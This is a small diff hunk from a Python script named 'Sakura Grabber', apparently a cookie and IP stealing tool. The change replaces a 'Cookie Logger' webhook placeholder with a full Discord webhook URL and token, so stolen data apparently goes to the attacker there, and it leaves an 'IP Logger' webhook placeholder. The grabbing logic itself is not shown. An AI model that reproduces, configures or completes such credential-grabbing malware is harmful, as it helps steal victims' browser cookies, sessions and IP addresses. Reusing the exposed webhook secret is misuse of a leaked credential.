@@ -9,7 +9,7 @@ from tkinter import messagebox
 
 os.system("title Sakura Grabber")
 
-webhook = "Enter Webhook Here - Cookie Logger"
+webhook = "https://discord.com/api/webhooks/1175208213323464787/UfIE0lk7g2EN-_LMd5u4HcZeHoOK1ZM30PQQH48KiMTvFQzIJaDl-AcJUP3RQjreMftW"
 webhook1 = Webhook('Enter Webhook Here - IP Logger')
 
 try:
